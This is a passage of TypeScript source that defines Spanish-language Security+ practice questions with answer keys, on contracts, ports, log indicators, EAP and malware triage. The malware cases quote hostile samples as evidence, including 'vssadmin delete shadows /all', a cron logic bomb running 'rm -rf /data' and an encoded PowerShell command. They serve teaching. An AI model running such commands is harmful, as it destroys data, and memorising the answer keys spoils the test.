          { id: 'e1', prompt: 'Un organismo supervisor exige auditorías anuales y puede sancionar si no se cumplen sus reglas.', answers: { external: 'regulatory' }, explanation: 'Requisitos impuestos y fiscalizados por un regulador: consideración regulatoria.' },
          { id: 'e2', prompt: 'Un contrato firmado obliga a notificar al cliente cualquier brecha en un plazo de 48 horas.', answers: { external: 'legal' }, explanation: 'Obligaciones que surgen de contratos o de la ley y pueden exigirse en un tribunal: consideración legal.' },
          { id: 'e3', prompt: 'Al procesar pagos con tarjeta, la empresa debe cumplir PCI DSS.', answers: { external: 'industry' }, explanation: 'Un estándar propio de un sector (tarjetas de pago) es una consideración de la industria.' },
          { id: 'e4', prompt: 'Una ley de la provincia donde está la planta exige guardar las grabaciones de seguridad durante 90 días.', answers: { external: 'local' }, explanation: 'Normas que aplican solo en una ciudad, provincia o región: consideración local/regional.' },
          { id: 'e5', prompt: 'La ley de protección de datos del país donde está la casa matriz se aplica a todas sus operaciones locales.', answers: { external: 'national' }, explanation: 'Una ley de alcance país es una consideración nacional.' },
          { id: 'e6', prompt: 'Al vender a clientes de la Unión Europea desde otros continentes, la empresa debe cumplir el GDPR en todas sus filiales.', answers: { external: 'global' }, explanation: 'Requisitos que alcanzan a operaciones en varios países o continentes: consideración global.' },
        ],
      },
    ],
  },
};

// ---------------------------------------------------------------------------
// PBQ 74 — Agreement types and vendor assessment (5.3)
// ---------------------------------------------------------------------------
const AGREEMENT_TYPES = [
  o('sla', 'SLA (Service-Level Agreement)'),
  o('mou', 'MOU (Memorandum of Understanding)'),
  o('moa', 'MOA (Memorandum of Agreement)'),
  o('msa', 'MSA (Master Service Agreement)'),
  o('sow', 'SOW / WO (Statement of Work / Work Order)'),
  o('nda', 'NDA (Non-Disclosure Agreement)'),
  o('bpa', 'BPA (Business Partners Agreement)'),
];
const VENDOR_ASSESSMENT = [
  o('due_diligence', 'Debida diligencia (Due diligence)'),
  o('questionnaire', 'Cuestionario de seguridad'),
  o('right_to_audit', 'Cláusula de derecho a auditoría'),
  o('conflict', 'Conflicto de interés'),
  o('supply_chain', 'Análisis de la cadena de suministro'),
  o('monitoring', 'Monitoreo continuo del proveedor'),
];

const PBQ74: MatrixPbqDefinition = {
  item: item(
    74,
    'third-party-governance',
    'Riesgo de Terceros',
    'Tipos de Acuerdos (SLA, MOU, MOA, MSA, SOW, NDA, BPA) y Evaluación de Proveedores',
    ['5.3', []],
    4,
    'El área de compras está cerrando contratos con varios proveedores y socios. Identifica el tipo de acuerdo que describe cada documento y la actividad de evaluación de proveedores de cada caso.',
    ['Sección 1: identifica el tipo de acuerdo.', 'Sección 2: identifica la actividad de evaluación del proveedor.'],
    'SLA = métricas de servicio y penalidades. MOU = intención, no vinculante. MOA = acuerdo formal con responsabilidades. MSA = términos generales para muchos trabajos; SOW/WO = el detalle de UN trabajo. NDA = confidencialidad. BPA = cómo se reparten responsabilidades y ganancias dos socios.'
  ),
  config: {
    pbqId: 'pbq-74',
    consoleTitle: 'Contratos y Proveedores (Objetivo 5.3)',
    instructions: 'Elige la opción que corresponde a cada caso. Algunas opciones pueden repetirse o no usarse.',
    sections: [
      {
        id: 's1',
        title: 'Acuerdos',
        columns: [{ id: 'agreement', label: 'Acuerdo', options: AGREEMENT_TYPES }],
        rows: [
          { id: 'a1', prompt: 'El proveedor de Internet garantiza 99,9 % de disponibilidad y responde incidentes críticos en menos de 1 hora; si no cumple, descuenta un porcentaje de la factura.', answers: { agreement: 'sla' }, explanation: 'Métricas de servicio medibles con penalidades: SLA.' },
          { id: 'a2', prompt: 'Dos empresas firman que tienen la intención de explorar un proyecto conjunto, sin compromisos legales todavía.', answers: { agreement: 'mou' }, explanation: 'Expresar una intención común, normalmente no vinculante: MOU.' },
          { id: 'a3', prompt: 'Dos organismos formalizan qué aportará cada uno y en qué condiciones para operar un centro de datos compartido.', answers: { agreement: 'moa' }, explanation: 'Un acuerdo formal que fija responsabilidades y condiciones concretas: MOA.' },
          { id: 'a4', prompt: 'El contrato marco con la consultora fija las tarifas, la confidencialidad y la responsabilidad para todos los trabajos de los próximos tres años.', answers: { agreement: 'msa' }, explanation: 'Términos generales que regirán muchos trabajos futuros: MSA.' },
          { id: 'a5', prompt: 'Bajo ese contrato marco se firma un documento con el alcance, las fechas y los entregables del pentest de este mes.', answers: { agreement: 'sow' }, explanation: 'El detalle de un trabajo puntual bajo el MSA es un SOW / Work Order.' },
          { id: 'a6', prompt: 'Antes de mostrar el código fuente a un posible socio, se le exige comprometerse a no revelarlo.', answers: { agreement: 'nda' }, explanation: 'Un compromiso de confidencialidad es un NDA.' },
          { id: 'a7', prompt: 'Dos empresas que venderán juntas un producto definen quién aporta qué, cómo se reparten las ganancias y quién responde ante los clientes.', answers: { agreement: 'bpa' }, explanation: 'La relación entre socios de negocio se regula con un BPA.' },
        ],
      },
      {
        id: 's2',
        title: 'Evaluación de proveedores',
        columns: [{ id: 'assessment', label: 'Actividad', options: VENDOR_ASSESSMENT }],
        rows: [
          { id: 'v1', prompt: 'Antes de contratar, se revisan los estados financieros, las demandas pasadas y las certificaciones del proveedor.', answers: { assessment: 'due_diligence' }, explanation: 'Investigar a fondo a un proveedor antes de elegirlo es debida diligencia.' },
          { id: 'v2', prompt: 'Se le envía al proveedor un formulario con preguntas sobre cifrado, backups, MFA y gestión de incidentes.', answers: { assessment: 'questionnaire' }, explanation: 'El formulario estandarizado de prácticas de seguridad es el cuestionario de seguridad.' },
          { id: 'v3', prompt: 'El contrato permite a la empresa inspeccionar los controles del proveedor con aviso previo.', answers: { assessment: 'right_to_audit' }, explanation: 'La facultad contractual de auditar al proveedor es la cláusula right-to-audit.' },
          { id: 'v4', prompt: 'Se descubre que el gerente que eligió al proveedor es socio de esa empresa.', answers: { assessment: 'conflict' }, explanation: 'Un interés personal que puede influir en la decisión es un conflicto de interés.' },
          { id: 'v5', prompt: 'Se verifica de dónde vienen los componentes de hardware del proveedor y quiénes son sus propios subcontratistas.', answers: { assessment: 'supply_chain' }, explanation: 'Evaluar los proveedores del proveedor es análisis de la cadena de suministro.' },
          { id: 'v6', prompt: 'Cada trimestre se revisan los informes de cumplimiento del proveedor y las noticias de brechas que lo involucren.', answers: { assessment: 'monitoring' }, explanation: 'Revisar al proveedor de forma continua después de contratarlo es monitoreo del proveedor.' },
        ],
      },
    ],
  },
};

// ---------------------------------------------------------------------------
// PBQ 75 — Port numbers from scenarios, typed (4.5)
// ---------------------------------------------------------------------------
const PBQ75: MatrixPbqDefinition = {
  item: item(
    75,
    'port-security',
    'Puertos y Protocolos',
    'Escribe el Puerto: Servicios y Números de Puerto según el Escenario',
    ['4.5', ['3.2']],
    4,
    'El administrador del firewall recibe pedidos de los equipos de la empresa. Para cada servicio, escribe el número de puerto por defecto que debe permitirse.',
    ['Escribe el número de puerto por defecto de cada servicio.', 'Si un servicio usa dos puertos, escribe ambos separados por coma.'],
    'Los más preguntados: FTP 20/21, SSH/SFTP 22, Telnet 23, SMTP 25, DNS 53, DHCP 67/68, TFTP 69, HTTP 80, Kerberos 88, NTP 123, SNMP 161/162, LDAP 389, HTTPS 443, SMB 445, Syslog 514, SMTP submission 587, LDAPS 636, DoT 853, IMAPS 993, POP3S 995, MS SQL 1433, RADIUS 1812/1813, MySQL 3306, RDP 3389, Syslog TLS 6514.'
  ),
  config: {
    pbqId: 'pbq-75',
    consoleTitle: 'Solicitudes de Apertura de Puertos (Objetivo 4.5)',
    instructions: 'Escribe solo el número (por ejemplo, 443).',
    sections: [
      {
        id: 's1',
        title: 'Solicitudes',
        columns: [{ id: 'port', label: 'Puerto', options: [], freeText: { placeholder: 'ej. 443' } }],
        rows: [
          { id: 'q1', prompt: 'Los administradores necesitan administrar los servidores Linux de forma remota y cifrada.', answers: { port: '22' }, explanation: 'SSH usa TCP 22.' },
          { id: 'q2', prompt: 'El servidor web público debe atender tráfico cifrado con TLS.', answers: { port: '443' }, explanation: 'HTTPS usa TCP 443.' },
          { id: 'q3', prompt: 'Los técnicos de soporte usan Escritorio Remoto para conectarse a los servidores Windows.', answers: { port: '3389' }, explanation: 'RDP usa TCP 3389.' },
          { id: 'q4', prompt: 'Los servidores deben consultar el DNS interno para resolver nombres.', answers: { port: '53' }, explanation: 'DNS usa el puerto 53 (UDP para consultas y TCP para transferencias de zona y respuestas grandes).' },
          { id: 'q5', prompt: 'Las aplicaciones consultan el Active Directory por un canal cifrado.', answers: { port: '636' }, explanation: 'LDAPS usa TCP 636 (LDAP sin cifrar usa 389).' },
          { id: 'q6', prompt: 'Los equipos comparten archivos con el servidor de archivos de Windows.', answers: { port: '445' }, explanation: 'SMB usa TCP 445.' },
          { id: 'q7', prompt: 'Los clientes de correo leen el buzón por IMAP cifrado.', answers: { port: '993' }, explanation: 'IMAPS usa TCP 993.' },
          { id: 'q8', prompt: 'Los puntos de acceso Wi-Fi envían las solicitudes de autenticación 802.1X al servidor RADIUS.', answers: { port: '1812' }, explanation: 'La autenticación RADIUS usa UDP 1812 (1813 es para accounting).' },
          { id: 'q9', prompt: 'Los switches envían sus logs al servidor central por el protocolo tradicional, sin cifrar.', answers: { port: '514' }, explanation: 'Syslog tradicional usa UDP 514; la versión con TLS usa 6514.' },
          { id: 'q10', prompt: 'Los equipos sincronizan su reloj con el servidor de hora, necesario para Kerberos y para correlacionar logs.', answers: { port: '123' }, explanation: 'NTP usa UDP 123.' },
          { id: 'q11', prompt: 'Los clientes del dominio obtienen tickets del controlador de dominio.', answers: { port: '88' }, explanation: 'Kerberos usa el puerto 88.' },
          { id: 'q12', prompt: 'Un sistema antiguo transfiere archivos por FTP sin cifrar (canales de datos y de control).', answers: { port: '20,21|21,20|21' }, explanation: 'FTP usa TCP 21 para control y TCP 20 para datos (en modo activo).' },
          { id: 'q13', prompt: 'La aplicación se conecta a su base de datos Microsoft SQL Server.', answers: { port: '1433' }, explanation: 'MS SQL Server usa TCP 1433 (MySQL usa 3306).' },
          { id: 'q14', prompt: 'Los clientes de correo envían mensajes al servidor con autenticación y STARTTLS.', answers: { port: '587' }, explanation: 'El envío de los clientes (submission) usa TCP 587; entre servidores se usa 25.' },
        ],
      },
    ],
  },
};

// ---------------------------------------------------------------------------
// PBQ 92 — Official sub-topics no other PBQ covered (2.4, 2.2, 3.1, 3.3, 4.1, 4.3, 4.5)
// ---------------------------------------------------------------------------
const LOG_INDICATORS = [
  o('out_of_cycle', 'Registro fuera de ciclo'),
  o('missing_logs', 'Registros faltantes'),
  o('resource_consumption', 'Consumo de recursos'),
  o('resource_inaccessible', 'Recurso inaccesible'),
  o('account_lockout', 'Bloqueo de cuenta'),
  o('published', 'Publicado / documentado'),
];
const SYLLABUS_GAPS = [
  o('bloatware', 'Bloatware'),
  o('sase', 'SASE'),
  o('sovereignty', 'Soberanía de los datos'),
  o('selinux', 'SELinux'),
  o('xdr', 'XDR'),
  o('code_signing', 'Firma de código'),
  o('secure_cookies', 'Cookies seguras'),
  o('site_survey', 'Estudio de sitio / mapa de calor'),
  o('rescan', 'Volver a escanear (validación)'),
  o('gap_analysis', 'Análisis de brechas'),
];

const PBQ92: MatrixPbqDefinition = {
  item: item(
    92,
    'security-monitoring',
    'Temas del Temario Oficial',
    'Indicadores en los Registros y Temas Sueltos del SY0-701',
    ['2.4', ['2.2', '3.1', '3.3', '4.1', '4.3', '4.5']],
    4,
    'Antes de la auditoría, el SOC repasa indicadores que suelen pasar desapercibidos, y el equipo de arquitectura revisa conceptos del temario que todavía no aplicó. Identifica el concepto de cada caso.',
    ['Sección 1: el indicador de actividad maliciosa (2.4).', 'Sección 2: el control, tecnología o actividad que corresponde.'],
    'Fuera de ciclo = algo ocurre a una hora o fecha en la que no debería (un backup a las 3 de la mañana de un domingo sin programar). Registros faltantes = huecos en los logs, típico de un atacante que borra rastros. Publicado/documentado = el ataque o la filtración ya aparece en Internet o en un aviso público.'
  ),
  config: {
    pbqId: 'pbq-92',
    consoleTitle: 'Repaso de Temas del Temario (Objetivo 2.4 y otros)',
    instructions: 'Elige la opción que corresponde a cada caso. Algunas opciones pueden no usarse.',
    sections: [
      {
        id: 's1',
        title: 'Indicadores',
        columns: [{ id: 'ind', label: 'Indicador', options: LOG_INDICATORS }],
        rows: [
          { id: 'i1', prompt: 'El servidor de nóminas registra una exportación completa de datos a las 3:12 de la mañana de un domingo, fuera de cualquier tarea programada.', answers: { ind: 'out_of_cycle' }, explanation: 'Actividad en un momento en que no debería ocurrir: registro fuera de ciclo.' },
          { id: 'i2', prompt: 'Los logs de seguridad del controlador de dominio no tienen ninguna entrada entre las 01:00 y las 01:45, y el servicio no se detuvo.', answers: { ind: 'missing_logs' }, explanation: 'Un hueco en los registros suele indicar que el atacante borró sus rastros: registros faltantes.' },
          { id: 'i3', prompt: 'Un servidor web pasa de 10 % a 100 % de CPU y su tráfico de salida se dispara sin aumento de visitas.', answers: { ind: 'resource_consumption' }, explanation: 'Uso de CPU, memoria o red sin explicación (criptominería, exfiltración): consumo de recursos.' },
          { id: 'i4', prompt: 'Los usuarios no pueden abrir los archivos del recurso compartido: todos tienen una extensión nueva.', answers: { ind: 'resource_inaccessible' }, explanation: 'Archivos o servicios que dejan de estar disponibles (por ejemplo, por ransomware): recurso inaccesible.' },
          { id: 'i5', prompt: 'Varios usuarios llaman a soporte porque sus cuentas quedaron bloqueadas sin que ellos intentaran entrar.', answers: { ind: 'account_lockout' }, explanation: 'Bloqueos que el usuario no provocó indican intentos de adivinar contraseñas: bloqueo de cuenta.' },
          { id: 'i6', prompt: 'Un investigador avisa que una base con correos de clientes de la empresa se está vendiendo en un foro.', answers: { ind: 'published' }, explanation: 'La filtración ya es pública: indicador publicado/documentado.' },
        ],
      },
      {
        id: 's2',
        title: 'Conceptos',
        columns: [{ id: 'gap', label: 'Concepto', options: SYLLABUS_GAPS }],
        rows: [
          { id: 'g1', prompt: 'Los portátiles nuevos traen de fábrica programas de prueba y utilidades que nadie usa y amplían la superficie de ataque.', answers: { gap: 'bloatware' }, explanation: 'Software preinstalado e innecesario: bloatware. Se elimina al endurecer el equipo.' },
          { id: 'g2', prompt: 'Unificar en un servicio en la nube el SD-WAN con SWG, CASB, ZTNA y firewall para los empleados remotos.', answers: { gap: 'sase' }, explanation: 'Red y seguridad entregadas como servicio desde la nube: SASE (Secure Access Service Edge).' },
          { id: 'g3', prompt: 'Los datos de clientes europeos deben quedar sujetos a las leyes del país donde se almacenan.', answers: { gap: 'sovereignty' }, explanation: 'Los datos quedan sujetos a la ley del país donde residen: soberanía de los datos.' },
          { id: 'g4', prompt: 'En los servidores Linux se aplica control de acceso obligatorio (MAC) que limita qué puede hacer cada proceso.', answers: { gap: 'selinux' }, explanation: 'SELinux aplica MAC en Linux; el objetivo 4.5 lo nombra junto a Group Policy.' },
          { id: 'g5', prompt: 'Correlacionar la telemetría de endpoints, red, correo y nube en una sola plataforma de detección y respuesta.', answers: { gap: 'xdr' }, explanation: 'EDR se limita al endpoint; XDR (Extended Detection and Response) extiende la detección a varias capas.' },
          { id: 'g6', prompt: 'Garantizar que el instalador de la aplicación proviene del desarrollador y no fue alterado.', answers: { gap: 'code_signing' }, explanation: 'Una firma digital sobre el código prueba origen e integridad: firma de código.' },
          { id: 'g7', prompt: 'Que la cookie de sesión solo viaje por HTTPS y no sea accesible desde JavaScript.', answers: { gap: 'secure_cookies' }, explanation: 'Atributos Secure y HttpOnly: cookies seguras (objetivo 4.1).' },
          { id: 'g8', prompt: 'Antes de instalar los puntos de acceso, medir la cobertura y las interferencias en cada piso.', answers: { gap: 'site_survey' }, explanation: 'Un estudio de sitio con mapa de calor define dónde ubicar los AP y evita fugas de señal.' },
          { id: 'g9', prompt: 'Después de aplicar el parche, confirmar que la vulnerabilidad ya no aparece.', answers: { gap: 'rescan' }, explanation: 'La validación de la remediación se hace volviendo a escanear (objetivo 4.3).' },
          { id: 'g10', prompt: 'Comparar los controles actuales con los que exige un marco para saber qué falta implementar.', answers: { gap: 'gap_analysis' }, explanation: 'Estado actual contra estado deseado: análisis de brechas (objetivo 1.2).' },
        ],
      },
    ],
  },
};

// ---------------------------------------------------------------------------
// PBQ 93 — EAP and its variants (3.2, 4.1)
// ---------------------------------------------------------------------------
const EAP_METHODS = [
  o('eap_tls', 'EAP-TLS'),
  o('peap', 'PEAP'),
  o('eap_ttls', 'EAP-TTLS'),
  o('eap_fast', 'EAP-FAST'),
];
const EAP_CERTS = [
  o('both', 'Certificado en el servidor y en cada cliente'),
  o('server', 'Certificado solo en el servidor'),
  o('pac', 'Ningún certificado obligatorio: usa un PAC'),
];
const EAP_FACTS = [
  o('eap', 'EAP'),
  o('eap_tls', 'EAP-TLS'),
  o('peap', 'PEAP'),
  o('eap_ttls', 'EAP-TTLS'),
  o('eap_fast', 'EAP-FAST'),
  o('radius', 'RADIUS'),
  o('dot1x', '802.1X'),
];

const PBQ93: MatrixPbqDefinition = {
  item: item(
    93,
    'wireless-security',
    'Autenticación Inalámbrica',
    'EAP y sus Variantes: EAP-TLS, PEAP, EAP-TTLS y EAP-FAST',
    ['4.1', ['3.2']],
    5,
    'La empresa migra la red Wi-Fi y la red cableada a 802.1X con un servidor RADIUS. Cada sede tiene un requisito distinto de seguridad, de compatibilidad o de certificados. Elige el método EAP que corresponde a cada sede y qué certificados exige.',
    ['Sección 1: el método EAP de cada sede y los certificados que exige.', 'Sección 2: identifica el componente o el método que describe cada frase.'],
    'Cuenta los certificados: EAP-TLS = servidor Y cliente (mutuo, el más seguro). PEAP y EAP-TTLS = solo servidor, el usuario va dentro de un túnel TLS (PEAP es el de Microsoft con MSCHAPv2; TTLS admite métodos heredados como PAP o CHAP). EAP-FAST = Cisco, sin certificados obligatorios: usa un PAC (Protected Access Credential).'
  ),
  config: {
    pbqId: 'pbq-93',
    consoleTitle: 'Despliegue de 802.1X por Sede (Objetivo 4.1)',
    instructions: 'Para cada sede elige el método EAP y los certificados que exige. En la sección 2 elige el componente o método que describe cada frase.',
    sections: [
      {
        id: 's1',
        title: 'Sedes',
        columns: [
          { id: 'method', label: 'Método EAP', options: EAP_METHODS },
          { id: 'certs', label: 'Certificados', options: EAP_CERTS },
        ],
        rows: [
          {
            id: 'e1',
            prompt: 'Casa central: autenticación mutua con certificados, sin contraseñas que se puedan robar con phishing. Ya hay una PKI que emite certificados a cada portátil.',
            answers: { method: 'eap_tls', certs: 'both' },
            explanation: 'EAP-TLS autentica a ambos extremos con certificados: es el método más seguro y el que pide una PKI que emita un certificado por equipo.',
          },
          {
            id: 'e2',
            prompt: 'Sucursal con equipos Windows unidos al dominio: los usuarios entran con su usuario y contraseña del Active Directory; solo el servidor tiene certificado.',
            answers: { method: 'peap', certs: 'server' },
            explanation: 'PEAP crea un túnel TLS con el certificado del servidor y dentro autentica al usuario con MSCHAPv2 (usuario y contraseña del dominio). Es el más común en redes Windows.',
          },
          {
            id: 'e3',
            prompt: 'Laboratorio con un sistema heredado que solo sabe autenticar con PAP: hay que proteger esas credenciales dentro de un túnel cifrado.',
            answers: { method: 'eap_ttls', certs: 'server' },
            explanation: 'EAP-TTLS crea el túnel con el certificado del servidor y dentro admite métodos heredados (PAP, CHAP, MSCHAP), cosa que PEAP no hace.',
          },
          {
            id: 'e4',
            prompt: 'Almacén con equipos Cisco y sin infraestructura de certificados: se necesita un túnel seguro igual, y la reautenticación debe ser rápida al moverse entre puntos de acceso.',
            answers: { method: 'eap_fast', certs: 'pac' },
            explanation: 'EAP-FAST (Cisco) establece el túnel con un PAC (Protected Access Credential) en lugar de certificados, y está pensado para reautenticación rápida.',
          },
          {
            id: 'e5',
            prompt: 'Auditoría: el método debe impedir que un atacante con un punto de acceso falso (evil twin) consiga credenciales reutilizables, porque no existen contraseñas.',
            answers: { method: 'eap_tls', certs: 'both' },
            explanation: 'Sin contraseñas no hay nada que capturar: EAP-TLS solo usa certificados en ambos extremos. Con PEAP, un usuario que acepta un certificado falso puede entregar su contraseña.',
          },
        ],
      },
      {
        id: 's2',
        title: 'Conceptos',
        columns: [{ id: 'fact', label: 'Componente o método', options: EAP_FACTS }],
        rows: [
          { id: 'f1', prompt: 'Marco de autenticación que define cómo se transportan los distintos métodos; no es un método por sí solo.', answers: { fact: 'eap' }, explanation: 'EAP (Extensible Authentication Protocol) es el marco; EAP-TLS, PEAP, EAP-TTLS y EAP-FAST son sus métodos.' },
          { id: 'f2', prompt: 'Estándar de control de acceso por puerto que bloquea el puerto del switch o la asociación Wi-Fi hasta que el usuario se autentica.', answers: { fact: 'dot1x' }, explanation: '802.1X define el control de acceso por puerto con suplicante, autenticador (switch o AP) y servidor de autenticación.' },
          { id: 'f3', prompt: 'Servidor AAA que recibe las solicitudes del punto de acceso y valida las credenciales del método EAP.', answers: { fact: 'radius' }, explanation: 'RADIUS es el servidor de autenticación de 802.1X (puertos UDP 1812/1813). Trampa: EAP es el marco, no el servidor.' },
          { id: 'f4', prompt: 'Método desarrollado por Cisco que no exige certificados porque usa una credencial de acceso protegido.', answers: { fact: 'eap_fast' }, explanation: 'EAP-FAST usa un PAC en lugar de certificados.' },
          { id: 'f5', prompt: 'Método que encapsula EAP dentro de un túnel TLS y que Microsoft usa con MSCHAPv2.', answers: { fact: 'peap' }, explanation: 'PEAP (Protected EAP) = túnel TLS + MSCHAPv2 en el interior.' },
          { id: 'f6', prompt: 'Método que exige un certificado instalado en cada dispositivo cliente.', answers: { fact: 'eap_tls' }, explanation: 'Solo EAP-TLS exige certificado en el cliente; es su mayor fortaleza y su mayor costo de gestión.' },
        ],
      },
    ],
  },
};

// ---------------------------------------------------------------------------
// PBQ 94 — Malware identification and remediation (2.4, 4.8)
// ---------------------------------------------------------------------------
const MALWARE_TYPES = [
  o('virus', 'Virus'),
  o('worm', 'Gusano (worm)'),
  o('trojan', 'Troyano'),
  o('rat', 'Troyano de acceso remoto (RAT)'),
  o('ransomware', 'Ransomware'),
  o('spyware', 'Spyware'),
  o('keylogger', 'Keylogger'),
  o('adware', 'Adware'),
  o('bloatware', 'Bloatware'),
  o('rootkit', 'Rootkit'),
  o('logic_bomb', 'Bomba lógica'),
  o('fileless', 'Malware sin archivos (fileless)'),
  o('botnet', 'Bot / botnet'),
  o('cryptojacking', 'Criptominero (cryptojacking)'),
  o('backdoor', 'Puerta trasera (backdoor)'),
];
const REMEDIATIONS = [
  o('reimage', 'Aislar el equipo y reinstalarlo desde una imagen limpia'),
  o('restore_offline', 'Aislar los equipos y restaurar desde copias offline o inmutables'),
  o('patch_segment', 'Segmentar la red y parchear la vulnerabilidad en todos los equipos'),
  o('av_clean', 'Escanear con el antimalware actualizado y desinfectar los archivos'),
  o('remove_app_creds', 'Quitar la aplicación y cambiar las contraseñas desde un equipo limpio'),
  o('uninstall_baseline', 'Desinstalar el software innecesario y aplicar la línea base'),
  o('remove_code_review', 'Eliminar el código programado y revisar los cambios del autor'),
  o('kill_persistence', 'Detener el proceso, eliminar la persistencia y restringir PowerShell'),
  o('block_c2', 'Bloquear el servidor de comando y control y limpiar los equipos'),
  o('remove_account', 'Eliminar la cuenta oculta y revisar todos los accesos administrativos'),
  o('remove_extension', 'Eliminar la extensión o el programa y restablecer el navegador'),
];

const PBQ94: MatrixPbqDefinition = {
  item: item(
    94,
    'malware-triage',
    'Análisis de Malware',
    'Identificar el Tipo de Malware y Elegir la Remediación',
    ['2.4', ['4.8']],
    7,
    'El equipo de respuesta a incidentes recibe catorce casos de la semana. Para cada uno, identifica el tipo de malware a partir de la evidencia y elige el método de remediación más adecuado.',
    ['Identifica el tipo de malware de cada caso.', 'Elige la remediación que corresponde a ese malware.', 'Algunas opciones pueden no usarse o usarse más de una vez.'],
    'Busca el rasgo que lo delata: se propaga solo = gusano; necesita que alguien ejecute un archivo = virus; parece legítimo = troyano; da control remoto = RAT; se oculta del propio SO = rootkit; espera una fecha o condición = bomba lógica; vive en memoria = fileless. Si el malware toca el kernel o el arranque, no se limpia: se reinstala. Si cifra datos, se restaura desde copias offline.'
  ),
  config: {
    pbqId: 'pbq-94',
    consoleTitle: 'Casos de Malware de la Semana (Objetivo 2.4)',
    instructions: 'Lee la evidencia de cada caso, elige el tipo de malware y la remediación.',
    sections: [
      {
        id: 's1',
        title: 'Casos',
        columns: [
          { id: 'type', label: 'Tipo de malware', options: MALWARE_TYPES },
          { id: 'fix', label: 'Remediación', options: REMEDIATIONS },
        ],
        rows: [
          {
            id: 'm1',
            prompt: 'Todos los archivos del servidor de archivos tienen la extensión .locked y aparece una nota que pide 2 BTC para recuperarlos.',
            evidence: 'LEEME.txt · 48.312 archivos renombrados · vssadmin delete shadows /all',
            answers: { type: 'ransomware', fix: 'restore_offline' },
            explanation: 'Cifrar datos y pedir rescate es ransomware. Se aíslan los equipos y se restaura desde copias offline o inmutables, que el atacante no pudo cifrar; pagar no garantiza nada.',
          },
          {
            id: 'm2',
            prompt: 'En una hora, 200 equipos sin parche se infectaron entre sí por SMB sin que nadie abriera nada.',
            evidence: 'tcp/445 desde cada host infectado hacia toda la subred',
            answers: { type: 'worm', fix: 'patch_segment' },
            explanation: 'Propagarse solo por la red, explotando una vulnerabilidad, es un gusano. Se contiene segmentando y se corta parcheando esa vulnerabilidad en todos los equipos.',
          },
          {
            id: 'm3',
            prompt: 'Un ejecutable adjunto en un correo infectó otros .exe de la carpeta compartida cada vez que un usuario los abrió.',
            evidence: 'Hash de 14 ejecutables modificado · infección al ejecutarse',
            answers: { type: 'virus', fix: 'av_clean' },
            explanation: 'Necesita que el usuario ejecute el archivo y se adjunta a otros programas: virus. Lo resuelve un escaneo con el antimalware actualizado que desinfecta los archivos.',
          },
          {
            id: 'm4',
            prompt: 'Un "instalador gratuito" de un editor de PDF funciona bien, pero en segundo plano abrió una conexión saliente por la que el atacante controla el equipo y ve el escritorio.',
            evidence: 'pdfeditor_setup.exe → svchost32.exe → 185.220.101.4:8443 (persistente)',
            answers: { type: 'rat', fix: 'reimage' },
            explanation: 'Un programa aparentemente legítimo que da control remoto es un RAT. Como el atacante tuvo control total, no se confía en una limpieza: se aísla y se reinstala desde imagen limpia.',
          },
          {
            id: 'm5',
            prompt: 'Las herramientas del propio sistema no muestran ningún proceso extraño, pero un análisis de memoria encuentra hooks en el kernel y un controlador sin firmar.',
            evidence: 'SSDT hook detectado · driver no firmado cargado en el arranque',
            answers: { type: 'rootkit', fix: 'reimage' },
            explanation: 'Ocultarse del SO a nivel kernel es un rootkit. No se puede confiar en el sistema infectado para limpiarse: hay que reinstalar desde una imagen limpia.',
          },
          {
            id: 'm6',
            prompt: 'El día que despidieron a un administrador, un script programado por él borró la base de clientes.',
            evidence: 'cron: 0 9 * * 1 /opt/scripts/check.sh · si el usuario jperez no existe → rm -rf /data',
            answers: { type: 'logic_bomb', fix: 'remove_code_review' },
            explanation: 'Código que espera una condición (que la cuenta deje de existir) es una bomba lógica. Se elimina y se revisa todo lo que ese autor programó, por si dejó otras.',
          },
          {
            id: 'm7',
            prompt: 'Varias cuentas bancarias de empleados fueron vaciadas; en sus equipos un componente registraba cada tecla escrita y la enviaba por correo.',
            evidence: 'SetWindowsHookEx(WH_KEYBOARD_LL) · envío SMTP cada 10 minutos',
            answers: { type: 'keylogger', fix: 'remove_app_creds' },
            explanation: 'Registrar las pulsaciones es un keylogger. Se quita y, como las contraseñas ya se filtraron, se cambian todas desde un equipo limpio.',
          },
          {
            id: 'm8',
            prompt: 'Un portátil se calienta y va lento; la CPU está al 100 % con un proceso que se conecta a un pool de minería.',
            evidence: 'xmrig.exe · stratum+tcp://pool.minexmr.com:4444',
            answers: { type: 'cryptojacking', fix: 'block_c2' },
            explanation: 'Usar los recursos del equipo para minar criptomonedas es cryptojacking. Se bloquea la conexión al pool y se limpia el equipo.',
          },
          {
            id: 'm9',
            prompt: 'No hay ningún archivo malicioso en disco: un comando de PowerShell codificado en base64 se ejecuta desde una suscripción WMI cada vez que arranca el equipo.',
            evidence: 'powershell.exe -enc JABzAD0ATgBlAHcA… · WMI EventConsumer persistente',
            answers: { type: 'fileless', fix: 'kill_persistence' },
            explanation: 'Ejecutarse en memoria con herramientas legítimas es malware sin archivos. El antivirus no encuentra nada que borrar: se detiene el proceso, se elimina la persistencia (WMI, registro, tareas) y se restringe PowerShell.',
          },
          {
            id: 'm10',
            prompt: 'Cincuenta equipos internos consultan cada 60 segundos el mismo dominio y participan en un ataque de denegación de servicio contra un tercero.',
            evidence: 'Beacon HTTP cada 60 s a update-check.example.biz · picos de tráfico UDP saliente',
            answers: { type: 'botnet', fix: 'block_c2' },
            explanation: 'Equipos controlados en conjunto desde un servidor de comando y control forman una botnet. Se bloquea el C2 para cortar las órdenes y se limpian los equipos.',
          },
          {
            id: 'm11',
            prompt: 'En los servidores aparece una cuenta de administrador que nadie creó y que permite entrar por SSH aunque cambien las contraseñas de los demás.',
            evidence: 'Usuario "sysupdate" con UID 0 · clave pública añadida a authorized_keys',
            answers: { type: 'backdoor', fix: 'remove_account' },
            explanation: 'Un acceso oculto que evita la autenticación normal es una puerta trasera. Se elimina la cuenta y la clave y se revisan todos los accesos administrativos.',
          },
          {
            id: 'm12',
            prompt: 'Tras instalar una extensión de cupones, el navegador muestra ventanas emergentes de publicidad y cambió el buscador por defecto.',
            evidence: 'Extensión "Super Cupones" · página de inicio y buscador modificados',
            answers: { type: 'adware', fix: 'remove_extension' },
            explanation: 'Mostrar publicidad no deseada es adware. Se elimina la extensión y se restablece el navegador.',
          },
          {
            id: 'm13',
            prompt: 'Los portátiles nuevos traen de fábrica una docena de programas de prueba que nadie usa y que amplían la superficie de ataque.',
            answers: { type: 'bloatware', fix: 'uninstall_baseline' },
            explanation: 'Software preinstalado e innecesario es bloatware. Se desinstala y se aplica la línea base segura de la empresa.',
          },
          {
            id: 'm14',
